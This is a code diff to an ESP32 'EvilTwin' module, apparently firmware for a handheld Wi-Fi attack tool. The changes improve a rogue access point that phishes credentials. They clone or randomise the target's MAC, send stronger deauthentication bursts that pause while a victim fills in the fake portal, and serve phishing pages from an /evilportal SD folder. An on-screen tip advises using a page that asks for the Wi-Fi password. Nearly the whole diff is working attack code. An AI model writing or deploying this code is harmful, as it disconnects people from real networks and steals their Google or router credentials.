@@ -6,8 +6,13 @@
 #include "eviltwin.h"
 #include "input_handling.h"
 #include <WiFi.h>
+#include <SD.h>
 
 extern InputHandling inputHandler;
+
+// Accurate client count via AP events — softAPgetStationNum() counts OS-level
+// associations which includes brief probe/auth attempts and inflates the number.
+static volatile int s_etClients = 0;
 
 static const IPAddress AP_IP(192, 168, 4, 1);
 static const IPAddress AP_GW(192, 168, 4, 1);
@@ -93,29 +98,38 @@ input{width:100%;box-sizing:border-box;padding:10px;margin-bottom:16px;
 EvilTwin::EvilTwin(DisplayManager& dm, SDCardManager& sd)
     : dm(dm), sd(sd), server(80),
       _tmpl(0), _captureCount(0), _dirty(true),
-      _isClone(false), _targetChannel(1),
-      _deauthEnabled(false), _deauthLastMs(0), _deauthCount(0)
+      _isClone(false), _targetIsOpen(false), _targetChannel(1),
+      _deauthEnabled(false), _deauthLastMs(0), _deauthCount(0),
+      _useCustomTemplate(false)
 {
-    _ssid[0]     = '\0';
-    _lastUser[0] = '\0';
-    _lastPass[0] = '\0';
+    _ssid[0]            = '\0';
+    _lastUser[0]        = '\0';
+    _lastPass[0]        = '\0';
+    _sdTemplatePath[0]  = '\0';
+    _sdTemplateName[0]  = '\0';
     memset(_targetBSSID, 0, 6);
+    memset(_fakeMAC,     0, 6);
 }
 
 // ── Entry point ───────────────────────────────────────────────────────────────
 
 void EvilTwin::start(const char* ssid) {
-    _captureCount  = 0;
-    _lastUser[0]   = '\0';
-    _lastPass[0]   = '\0';
-    _tmpl          = 0;
-    _dirty         = true;
-    _isClone       = false;
-    _deauthEnabled = false;
-    _deauthLastMs  = 0;
-    _deauthCount   = 0;
-    _targetChannel = 1;
+    _captureCount       = 0;
+    _lastUser[0]        = '\0';
+    _lastPass[0]        = '\0';
+    _tmpl               = 0;
+    _dirty              = true;
+    _isClone            = false;
+    _targetIsOpen       = false;
+    _deauthEnabled      = false;
+    _deauthLastMs       = 0;
+    _deauthCount        = 0;
+    _targetChannel      = 1;
+    _useCustomTemplate  = false;
+    _sdTemplatePath[0]  = '\0';
+    _sdTemplateName[0]  = '\0';
     memset(_targetBSSID, 0, 6);
+    memset(_fakeMAC,     0, 6);
 
     if (ssid && *ssid) {
         // SSID provided as argument → skip menu, custom mode
@@ -135,8 +149,17 @@ void EvilTwin::start(const char* ssid) {
     WiFi.mode(WIFI_AP);
 
     if (_isClone) {
-        // Spoof the real AP's MAC so clients see an identical twin
-        esp_wifi_set_mac(WIFI_IF_AP, _targetBSSID);
+        if (_targetIsOpen) {
+            // Open network: clone MAC exactly — clients reconnect with no security mismatch
+            memcpy(_fakeMAC, _targetBSSID, 6);
+        } else {
+            // Secured network: use a random locally-administered MAC for our fake AP.
+            // Deauth frames still carry the real AP's BSSID as SA, so they only kick
+            // clients off the real AP and never touch our own connected clients.
+            for (int i = 0; i < 6; i++) _fakeMAC[i] = (uint8_t)(esp_random() & 0xFF);
+            _fakeMAC[0] = (_fakeMAC[0] & 0xFE) | 0x02; // unicast, locally administered
+        }
+        esp_wifi_set_mac(WIFI_IF_AP, _fakeMAC);
     }
 
     WiFi.softAPConfig(AP_IP, AP_GW, AP_NM);
@@ -147,6 +170,13 @@ void EvilTwin::start(const char* ssid) {
         // Promiscuous mode required for raw 802.11 TX injection
         esp_wifi_set_promiscuous(true);
     }
+
+    // Track connected clients via events — accurate unlike softAPgetStationNum()
+    s_etClients = 0;
+    _evConn = WiFi.onEvent([](WiFiEvent_t, WiFiEventInfo_t) { s_etClients++; },
+                            ARDUINO_EVENT_WIFI_AP_STACONNECTED);
+    _evDisc = WiFi.onEvent([](WiFiEvent_t, WiFiEventInfo_t) { if (s_etClients > 0) s_etClients--; },
+                            ARDUINO_EVENT_WIFI_AP_STADISCONNECTED);
 
     // ── DNS + HTTP ────────────────────────────────────────────────────────────
     dns.start(53, "*", AP_IP);
@@ -161,7 +191,11 @@ void EvilTwin::start(const char* ssid) {
         dns.processNextRequest();
         server.handleClient();
 
-        if (_deauthEnabled && millis() - _deauthLastMs >= 1000) {
+        // Adaptive deauth: only fire when nobody is on the fake AP.
+        // Pauses automatically the moment a client connects so they can
+        // complete the form uninterrupted. Resumes when they leave.
+        if (_deauthEnabled && s_etClients == 0 &&
+            millis() - _deauthLastMs >= 8000) {
             sendDeauthBurst();
             _deauthLastMs = millis();
         }
@@ -174,10 +208,21 @@ void EvilTwin::start(const char* ssid) {
 
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') break;
-        if (k == 't' || k == 'T') { _tmpl = (_tmpl + 1) % 2; _dirty = true; }
+        if (k == 't' || k == 'T') {
+            _useCustomTemplate = false;   // switch back to built-ins
+            _tmpl = (_tmpl + 1) % 2;
+            _dirty = true;
+        }
+        if (k == 's' || k == 'S') {
+            server.stop(); dns.stop();   // pause portal during picker
+            if (pickSdTemplate()) _dirty = true;
+            setupRoutes(); server.begin(); // resume
+        }
     }
 
     // ── Teardown ──────────────────────────────────────────────────────────────
+    WiFi.removeEvent(_evConn);
+    WiFi.removeEvent(_evDisc);
     server.stop();
     dns.stop();
     if (_deauthEnabled) esp_wifi_set_promiscuous(false);
@@ -265,10 +310,11 @@ bool EvilTwin::doScanAndPick() {
             int idx = page * ET_PER_PAGE + (k - '1');
             if (idx < n) {
                 strncpy(_ssid, WiFi.SSID(idx).c_str(), 32);
-                _ssid[32] = '\0';
+                _ssid[32]      = '\0';
                 memcpy(_targetBSSID, WiFi.BSSID(idx), 6);
                 _targetChannel = WiFi.channel(idx);
-                _isClone = true;
+                _targetIsOpen  = (WiFi.encryptionType(idx) == WIFI_AUTH_OPEN);
+                _isClone       = true;
                 WiFi.scanDelete();
                 return askDeauth();
             }
@@ -288,14 +334,15 @@ void EvilTwin::drawScanList(int total, int page) {
     int end   = min(start + ET_PER_PAGE, total);
 
     for (int i = start; i < end; i++) {
+        bool isOpen = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
         dm.setCursor(4, dm.getCursorY());
-        dm.setTextColor(TFT_WHITE);
+        dm.setTextColor(isOpen ? TFT_GREEN : TFT_WHITE);
         char buf[48];
-        snprintf(buf, sizeof(buf), "[%d] %-18.18s ch%-2d %4ddB",
+        snprintf(buf, sizeof(buf), "[%d] %-15.15s %s ch%d",
                  i - start + 1,
                  WiFi.SSID(i).c_str(),
-                 WiFi.channel(i),
-                 WiFi.RSSI(i));
+                 isOpen ? "OPEN" : "WPA ",
+                 WiFi.channel(i));
         dm.println(buf);
     }
 
@@ -376,8 +423,19 @@ bool EvilTwin::askDeauth() {
     dm.println(buf);
 
     dm.setCursor(4, dm.getCursorY());
-    snprintf(buf, sizeof(buf), "Ch  : %d", _targetChannel);
+    snprintf(buf, sizeof(buf), "Ch  : %d   Sec: %s",
+             _targetChannel, _targetIsOpen ? "OPEN" : "WPA2");
     dm.println(buf);
+
+    dm.setCursor(4, dm.getCursorY());
+    dm.setTextColor(_targetIsOpen ? TFT_GREEN : TFT_YELLOW);
+    if (_targetIsOpen) {
+        dm.println("Open: clone MAC — seamless reconnect");
+    } else {
+        dm.println("WPA2: random MAC — open fake AP");
+        dm.setCursor(4, dm.getCursorY());
+        dm.println("Tip: use a portal page asking for WiFi password");
+    }
 
     dm.setCursor(4, dm.getCursorY());
     dm.println("");
@@ -419,6 +477,16 @@ void EvilTwin::setupRoutes() {
 }
 
 void EvilTwin::handleRoot() {
+    if (_useCustomTemplate && sd.isReady()) {
+        File f = SD.open(_sdTemplatePath);
+        if (f) {
+            String html = f.readString();
+            f.close();
+            server.send(200, "text/html", html);
+            return;
+        }
+        _useCustomTemplate = false; // file gone — fall through to built-in
+    }
     server.send(200, "text/html", _tmpl == 0 ? HTML_GOOGLE : HTML_ROUTER);
 }
 
@@ -461,7 +529,7 @@ void EvilTwin::sendDeauthBurst() {
         memcpy(frame + 16, _targetBSSID, 6); // BSSID = real AP
         frame[22] = 0x00; frame[23] = 0x00;
         frame[24] = 0x07; frame[25] = 0x00; // reason 7
-        for (int i = 0; i < 5; i++) {
+        for (int i = 0; i < 15; i++) {
             esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
             delay(1);
         }
@@ -488,22 +556,32 @@ void EvilTwin::drawScreen() {
     dm.setCursor(4, dm.getCursorY());
     dm.setTextColor(0x7BEF);
     if (_isClone) {
-        snprintf(buf, sizeof(buf), "MAC  : %02X:%02X:%02X:%02X:%02X:%02X (spoofed)",
-                 _targetBSSID[0], _targetBSSID[1], _targetBSSID[2],
-                 _targetBSSID[3], _targetBSSID[4], _targetBSSID[5]);
+        if (_targetIsOpen) {
+            snprintf(buf, sizeof(buf), "MAC : %02X:%02X:%02X:%02X:%02X:%02X clone",
+                     _fakeMAC[0], _fakeMAC[1], _fakeMAC[2],
+                     _fakeMAC[3], _fakeMAC[4], _fakeMAC[5]);
+        } else {
+            snprintf(buf, sizeof(buf), "MAC : %02X:%02X:%02X:%02X:%02X:%02X rnd",
+                     _fakeMAC[0], _fakeMAC[1], _fakeMAC[2],
+                     _fakeMAC[3], _fakeMAC[4], _fakeMAC[5]);
+        }
     } else {
-        strcpy(buf, "IP   : 192.168.4.1");
+        strcpy(buf, "IP  : 192.168.4.1");
     }
     dm.println(buf);
 
     dm.setCursor(4, dm.getCursorY());
-    snprintf(buf, sizeof(buf), "Chan : %d   Page: %s",
-             _targetChannel, _tmpl == 0 ? "Google" : "Router");
+    if (_useCustomTemplate) {
+        snprintf(buf, sizeof(buf), "Chan : %d   Page: %.20s", _targetChannel, _sdTemplateName);
+    } else {
+        snprintf(buf, sizeof(buf), "Chan : %d   Page: %s",
+                 _targetChannel, _tmpl == 0 ? "Google" : "Router");
+    }
     dm.println(buf);
 
     dm.setCursor(4, dm.getCursorY());
     dm.setTextColor(TFT_YELLOW);
-    snprintf(buf, sizeof(buf), "Clients  : %d", (int)WiFi.softAPgetStationNum());
+    snprintf(buf, sizeof(buf), "Clients  : %d", (int)s_etClients);
     dm.println(buf);
 
     dm.setCursor(4, dm.getCursorY());
@@ -523,12 +601,104 @@ void EvilTwin::drawScreen() {
 
     if (_deauthEnabled) {
         dm.setCursor(4, dm.getCursorY());
-        dm.setTextColor(TFT_RED);
-        snprintf(buf, sizeof(buf), "Deauth   : %d bursts", _deauthCount);
+        bool clientPresent = s_etClients > 0;
+        if (clientPresent) {
+            dm.setTextColor(TFT_GREEN);
+            snprintf(buf, sizeof(buf), "Deauth: PAUSED — client on portal");
+        } else {
+            dm.setTextColor(TFT_RED);
+            uint32_t elapsed   = millis() - _deauthLastMs;
+            uint32_t nextInSec = elapsed >= 8000 ? 0 : (8000 - elapsed) / 1000;
+            snprintf(buf, sizeof(buf), "Deauth: %d bursts  next:%lus",
+                     _deauthCount, (unsigned long)nextInSec);
+        }
         dm.println(buf);
     }
 
     dm.setCursor(4, dm.getCursorY());
     dm.setTextColor(0x7BEF);
-    dm.println("[q] quit  [t] toggle page");
+    dm.println("[q] quit  [t] built-in  [s] SD template");
+}
+
+// ── SD template picker ────────────────────────────────────────────────────────
+
+bool EvilTwin::pickSdTemplate() {
+    auto showErr = [&](const char* line1, const char* line2 = nullptr) {
+        dm.clearScreen();
+        dm.setDefaultTextSize();
+        dm.setCursor(4, outputY);
+        dm.setTextColor(TFT_RED);
+        dm.println(line1);
+        if (line2) {
+            dm.setCursor(4, dm.getCursorY());
+            dm.setTextColor(0x7BEF);
+            dm.println(line2);
+        }
+        delay(2500);
+    };
+
+    if (!sd.isReady()) { showErr("SD card not ready."); return false; }
+
+    File dir = SD.open("/evilportal");
+    if (!dir || !dir.isDirectory()) {
+        showErr("No /evilportal/ folder on SD.", "Create it and add .html files.");
+        return false;
+    }
+
+    // Collect up to 8 .html / .htm filenames
+    char names[8][48] = {};
+    int  count = 0;
+    while (count < 8) {
+        File f = dir.openNextFile();
+        if (!f) break;
+        if (!f.isDirectory()) {
+            String nm = String(f.name());
+            String nml = nm; nml.toLowerCase();
+            if (nml.endsWith(".html") || nml.endsWith(".htm")) {
+                strncpy(names[count], nm.c_str(), 47);
+                names[count][47] = '\0';
+                count++;
+            }
+        }
+        f.close();
+    }
+    dir.close();
+
+    if (count == 0) {
+        showErr("No .html files in /evilportal/");
+        return false;
+    }
+
+    // Show picker
+    dm.clearScreen();
+    dm.setDefaultTextSize();
+    dm.setCursor(4, outputY);
+    dm.setTextColor(TFT_CYAN);
+    dm.println("SD Templates — pick file:");
+
+    for (int i = 0; i < count; i++) {
+        dm.setCursor(4, dm.getCursorY());
+        dm.setTextColor(TFT_WHITE);
+        char buf[52];
+        snprintf(buf, sizeof(buf), "[%d] %s", i + 1, names[i]);
+        dm.println(buf);
+    }
+    dm.setCursor(4, dm.getCursorY());
+    dm.setTextColor(0x7BEF);
+    dm.println("[q] cancel");
+
+    while (true) {
+        char k = inputHandler.getKeyboardInput();
+        if (!k) { delay(20); continue; }
+        if (k == 'q' || k == 'Q') return false;
+        if (k >= '1' && k <= '0' + count) {
+            int idx = k - '1';
+            snprintf(_sdTemplatePath, sizeof(_sdTemplatePath),
+                     "/evilportal/%s", names[idx]);
+            strncpy(_sdTemplateName, names[idx], 31);
+            _sdTemplateName[31] = '\0';
+            _useCustomTemplate  = true;
+            return true;
+        }
+    }
 }
